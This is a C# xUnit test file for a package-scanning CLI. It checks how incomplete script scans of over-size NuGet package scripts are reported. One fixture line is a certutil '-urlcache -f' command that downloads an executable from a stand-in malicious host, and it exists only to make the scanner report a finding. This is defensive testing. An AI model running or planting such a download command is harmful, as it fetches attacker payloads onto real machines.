namespace Silvergun.CLI.Tests;

using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Text;
using System.Text.Json;

using Xunit;

/// <summary>
/// ADR 0035 decisions 1 and 2 through the real <c>scan-package</c> verb, in a child process: a package whose script is
/// over the 5 MiB script cap — the steerable skip, the one failure path a package can reach end to end — is reported
/// <c>ScriptScanStatus: Unavailable</c> with a reason naming the file and its size, its scanned files' findings kept, a
/// <c>Completeness</c> caveat, ONE stderr advisory ending " Reason: …", and a human report that is never "Clean".
///
/// <para>The packages are built here with pure BCL zip. The over-cap script is plain comment filler, stored
/// <b>uncompressed</b> (<see cref="CompressionLevel.NoCompression"/>) so the entry's ratio is 1:1 and clears the
/// extractor's zip-bomb ratio cap — no random padding is needed. The "with findings" variant adds a small script with
/// the existing benign-but-matching certutil line the NuGet suite's fixtures use. Every run is <c>--no-vulns --no-yara</c>
/// (offline, deterministic); <c>--no-vulns</c> leaves its own "did not run" caveat, so the exit code alone cannot
/// discriminate the script caveat — the <c>Completeness</c> caveats and the advisory are what do (the exit-code truth
/// table for the script caveat alone is pinned in-process by <see cref="ScriptScanCoverageCompletenessTests"/>).</para>
/// </summary>
public sealed class ScriptScanCoverageCliTests
{
    #region Methods: an over-cap script, no findings
    [Fact]
    [Trait("Category", "Slow")]
    public void ScanPackage_WithAnOverCapScript_JsonIsUnavailableWithTheReasonAndTheCaveat()
    {
        var run = Run(withFindings: false, "--json", "--allow-incomplete");

        Assert.True(run.Exited, "CLI did not exit within the timeout.");
        Assert.Equal(0, run.Exit);
        using var doc = JsonDocument.Parse(run.Output);
        var root = doc.RootElement;
        Assert.Equal("Unavailable", root.GetProperty("ScriptScanStatus").GetString());
        Assert.Equal(
            $"1 of 2 script/manifest file(s) were not scanned: 'tools/big.ps1 (is {OverCapBytes} bytes, over the 5242880-byte script cap)'",
            root.GetProperty("ScriptScanUnavailableReason").GetString());
        Assert.Empty(root.GetProperty("ScriptFindings").EnumerateArray());
        var completeness = root.GetProperty("Completeness");
        Assert.False(completeness.GetProperty("IsComplete").GetBoolean());
        Assert.Contains(Caveat, completeness.GetProperty("Caveats").EnumerateArray().Select(e => e.GetString()));
    }

    // The no-findings advisory: printed once, says the scan did NOT complete, and ends with the report's own reason.
    [Fact]
    [Trait("Category", "Slow")]
    public void ScanPackage_WithAnOverCapScript_PrintsTheNoFindingsAdvisoryOnce_EndingWithTheReason()
    {
        var run = Run(withFindings: false, "--json", "--allow-incomplete");

        Assert.True(run.Exited, "CLI did not exit within the timeout.");
        using var doc = JsonDocument.Parse(run.Output);
        var reason = doc.RootElement.GetProperty("ScriptScanUnavailableReason").GetString()!;
        var advisory = Advisory(run.Error);
        Assert.StartsWith(
            "scan-package: script content scanning did NOT complete (some or all script/manifest files were not scanned); "
            + "script findings for this package are NOT verified against the script ruleset.",
            advisory, StringComparison.Ordinal);
        Assert.EndsWith(" Reason: " + reason, advisory, StringComparison.Ordinal);
        AssertNoRawControlCharacters(run.Error);
    }

    // The human report: "Not verified", never "Clean", with the section note; and without --allow-incomplete, exit 3
    // under --strict too (nothing gates; the run is incomplete).
    [Fact]
    [Trait("Category", "Slow")]
    public void ScanPackage_WithAnOverCapScript_HumanReportIsNotVerified_AndStrictExitsThree()
    {
        var run = Run(withFindings: false, "--strict");

        Assert.True(run.Exited, "CLI did not exit within the timeout.");
        Assert.Equal(3, run.Exit);
        var headline = FooterHeadline.Of(run.Output);
        Assert.True(FooterHeadline.IsNotVerified(headline), $"the verdict is not 'Not verified': {headline}");
        Assert.False(FooterHeadline.IsClean(headline));
        Assert.Contains("Script content scan did NOT complete", run.Output, StringComparison.Ordinal);
        // ADR 0035 review W3: the saved text report names the reason too, not only stderr and the JSON. A short prefix,
        // so the redirected console's wrapping width cannot split it.
        Assert.Contains("Reason: 1 of 2 script/manifest file(s)", run.Output, StringComparison.Ordinal);
        Assert.Contains("scan-package: analysis INCOMPLETE", run.Error, StringComparison.Ordinal);
        Assert.Contains(Caveat, run.Error, StringComparison.Ordinal);
    }
    #endregion

    #region Methods: an over-cap script beside one that matches
    // The findings of the file that did scan are kept, and the advisory is the with-findings variant, with their count.
    [Fact]
    [Trait("Category", "Slow")]
    public void ScanPackage_WithAnOverCapScriptAndAMatchingOne_KeepsTheFindings_AndPrintsTheWithFindingsAdvisoryOnce()
    {
        var run = Run(withFindings: true, "--json", "--allow-incomplete");

        Assert.True(run.Exited, "CLI did not exit within the timeout.");
        Assert.Equal(0, run.Exit);
        using var doc = JsonDocument.Parse(run.Output);
        var root = doc.RootElement;
        Assert.Equal("Unavailable", root.GetProperty("ScriptScanStatus").GetString());
        var findings = root.GetProperty("ScriptFindings").EnumerateArray().ToArray();
        Assert.NotEmpty(findings);
        Assert.All(findings, f => Assert.Equal("tools/small.ps1", f.GetProperty("RelativePath").GetString()));
        var reason = root.GetProperty("ScriptScanUnavailableReason").GetString()!;
        Assert.StartsWith("1 of 3 script/manifest file(s) were not scanned: 'tools/big.ps1 (is ", reason, StringComparison.Ordinal);
        var advisory = Advisory(run.Error);
        Assert.StartsWith(
            $"scan-package: script content scanning did NOT complete; {findings.Length} script finding(s) were found in the files that were scanned, "
            + "and the remaining script/manifest files are NOT verified against the script ruleset.",
            advisory, StringComparison.Ordinal);
        Assert.EndsWith(" Reason: " + reason, advisory, StringComparison.Ordinal);
    }

    // The human report: "Findings present", never "Clean", and the incomplete disclosure names the script caveat.
    [Fact]
    [Trait("Category", "Slow")]
    public void ScanPackage_WithAnOverCapScriptAndAMatchingOne_HumanReportIsFindingsPresent()
    {
        var run = Run(withFindings: true);

        Assert.True(run.Exited, "CLI did not exit within the timeout.");
        Assert.Equal(3, run.Exit);
        Assert.Equal(FooterHeadline.FindingsPresent(rich: false), FooterHeadline.Of(run.Output));
        Assert.Contains("Script content scan INCOMPLETE", run.Output, StringComparison.Ordinal);
        Assert.Contains("Reason: 1 of 3 script/manifest file(s)", run.Output, StringComparison.Ordinal);   // W3
        Assert.Contains("small.ps1", run.Output, StringComparison.Ordinal);
    }
    #endregion

    #region Methods: the control
    // A package whose scripts all scan: Completed, no reason in the JSON, no script caveat, and no advisory.
    [Fact]
    public void ScanPackage_WhenEveryScriptScans_IsCompleted_WithNoAdvisory()
    {
        var nupkg = BuildNupkg("SilvergunScriptScanComplete", ("tools/init.ps1", Encoding.UTF8.GetBytes("Write-Host 'installing'\n"), CompressionLevel.Optimal));
        try
        {
            var run = RunCli("scan-package", nupkg, "--no-vulns", "--no-yara", "--json", "--allow-incomplete");

            Assert.True(run.Exited, "CLI did not exit within the timeout.");
            Assert.Equal(0, run.Exit);
            using var doc = JsonDocument.Parse(run.Output);
            Assert.Equal("Completed", doc.RootElement.GetProperty("ScriptScanStatus").GetString());
            Assert.False(doc.RootElement.TryGetProperty("ScriptScanUnavailableReason", out _));
            Assert.DoesNotContain(Caveat, doc.RootElement.GetProperty("Completeness").GetProperty("Caveats").EnumerateArray().Select(e => e.GetString()));
            Assert.DoesNotContain("script content scanning did NOT complete", run.Error, StringComparison.Ordinal);
        }
        finally
        {
            TryDelete(nupkg);
        }
    }
    #endregion

    #region Methods: helpers
    private static CliRun Run(bool withFindings, params string[] flags)
    {
        var entries = new List<(string, byte[], CompressionLevel)> { ("tools/big.ps1", Filler(OverCapBytes), CompressionLevel.NoCompression) };
        if (withFindings)
            entries.Add(("tools/small.ps1", Encoding.UTF8.GetBytes(SmallMatchingPs1), CompressionLevel.Optimal));
        var nupkg = BuildNupkg("SilvergunScriptScanOverCap", [.. entries]);
        try
        {
            return RunCli(new[] { "scan-package", nupkg, "--no-vulns", "--no-yara" }.Concat(flags).ToArray());
        }
        finally
        {
            TryDelete(nupkg);
        }
    }

    // The one script-scan advisory line on stderr; fails unless there is exactly one.
    private static string Advisory(string stderr) =>
        Assert.Single(stderr.Split('\n'), l => l.StartsWith("scan-package: script content scanning did NOT complete", StringComparison.Ordinal)).TrimEnd('\r');

    // Ordinary PowerShell comment lines cut to exactly `length` bytes (see the class remarks for why plain text works).
    private static byte[] Filler(long length)
    {
        var line = Encoding.ASCII.GetBytes("# filler comment line for the script size cap test\n");
        var bytes = new byte[length];
        for (var i = 0; i < bytes.Length; i += line.Length)
            line.AsSpan(0, (int)Math.Min(line.Length, bytes.Length - i)).CopyTo(bytes.AsSpan(i));
        return bytes;
    }

    private static CliRun RunCli(params string[] args)
    {
        var psi = new ProcessStartInfo(CliExe)
        {
            RedirectStandardOutput = true,
            RedirectStandardError = true,
            RedirectStandardInput = true,
            UseShellExecute = false,
            StandardOutputEncoding = Encoding.Latin1,
            StandardErrorEncoding = Encoding.Latin1,
        };
        foreach (var arg in args)
            psi.ArgumentList.Add(arg);
        psi.Environment["NO_COLOR"] = "1";

        using var process = Process.Start(psi)!;
        process.StandardInput.Close();
        var stdout = process.StandardOutput.ReadToEndAsync();
        var stderr = process.StandardError.ReadToEndAsync();
        if (!process.WaitForExit(TimeoutMs))
        {
            try { process.Kill(entireProcessTree: true); } catch { /* best-effort */ }
            return new CliRun(-1, string.Empty, string.Empty, false);
        }

        return new CliRun(process.ExitCode, stdout.GetAwaiter().GetResult(), stderr.GetAwaiter().GetResult(), true);
    }

    // A minimal valid .nupkg: the root nuspec plus the given entries, each with its own compression level. Pure BCL zip.
    private static string BuildNupkg(string id, params (string Entry, byte[] Bytes, CompressionLevel Level)[] entries)
    {
        var nuspec = $"""
            <?xml version="1.0" encoding="utf-8"?>
            <package xmlns="{NuspecNamespace}">
              <metadata>
                <id>{id}</id>
                <version>1.0.0</version>
                <authors>Silvergun Tests</authors>
                <description>Script-scan coverage test package.</description>
              </metadata>
            </package>
            """;

        var path = Path.Combine(Path.GetTempPath(), $"silvergun-script-coverage-{Guid.NewGuid():N}.nupkg");
        using (var stream = new FileStream(path, FileMode.Create, FileAccess.Write))
        using (var zip = new ZipArchive(stream, ZipArchiveMode.Create))
        {
            Write(zip, $"{id}.nuspec", Encoding.UTF8.GetBytes(nuspec), CompressionLevel.Optimal);
            foreach (var (entry, bytes, level) in entries)
                Write(zip, entry, bytes, level);
        }
        return path;

        static void Write(ZipArchive zip, string name, byte[] bytes, CompressionLevel level)
        {
            using var s = zip.CreateEntry(name, level).Open();
            s.Write(bytes, 0, bytes.Length);
        }
    }

    private static void TryDelete(string path)
    {
        try { if (File.Exists(path)) File.Delete(path); } catch { /* best-effort temp cleanup */ }
    }

    // Everything but CR/LF/TAB is a raw control character here.
    private static void AssertNoRawControlCharacters(string text)
    {
        var offender = text.FirstOrDefault(c => (c < ' ' && c is not '\r' and not '\n' and not '\t') || c is >= (char)0x7F and <= (char)0x9F);
        Assert.True(offender == '\0', $"output carried raw control character U+{(int)offender:X4}.");
    }
    #endregion

    #region Nested types
    private sealed record CliRun(int Exit, string Output, string Error, bool Exited);
    #endregion

    #region Fields
    private static readonly string CliExe = ApphostPath.Resolve(AppContext.BaseDirectory, "Silvergun.CLI");

    private const string Caveat = "script content scanning did not complete";

    // 5 MiB + 1234: over the cap by a non-round amount, so the reason must carry the real byte count.
    private const long OverCapBytes = 5L * 1024 * 1024 + 1234;

    // The NuGet suite's PackageFixture.SmallMatchingPs1: one benign-but-matching certutil LOLBAS line (the host is never
    // contacted). Duplicated because this project does not reference that test assembly.
    private const string SmallMatchingPs1 =
        "Start-Process certutil -ArgumentList '-urlcache','-f','http://malicious.example/s.exe'\n";

    private const string NuspecNamespace = "http://schemas.microsoft.com/packaging/2013/05/nuspec.xsd";
    private const int TimeoutMs = 120_000;
    #endregion
}
